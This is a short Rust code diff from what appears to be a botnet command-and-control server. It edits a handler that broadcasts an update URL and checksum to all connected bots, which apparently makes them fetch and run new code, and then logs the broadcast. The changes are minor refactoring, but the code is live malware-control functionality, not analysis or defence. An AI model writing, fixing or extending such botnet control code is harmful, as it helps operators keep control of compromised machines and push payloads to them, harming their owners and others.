@@ -535,9 +535,9 @@ pub async fn handle_update_command(client: &Arc<Client>, state: &Arc<AppState>, 
     
     client.write(format!("\x1b[38;5;226m[!] Broadcasting update command to all bots...\n\rURL: {}\n\r", url).as_bytes()).await?;
     
-    state.bot_manager.broadcast_update(url.to_string(), checksum.clone()).await;
+    state.bot_manager.broadcast_update(url, checksum.as_deref().unwrap_or("")).await;
     
-    client.write(b"\x1b[38;5;82m[✓] Update broadcast complete.\n\r").await?;
+    client.write(b"\x1b[38;5;82m[\xE2\x9C\x93] Update broadcast complete.\n\r").await?;
     
     let audit_event = AuditLog::new(client.user.username.clone(), "BROADCAST_UPDATE".to_string(), "SUCCESS".to_string())
         .with_target(url.to_string());
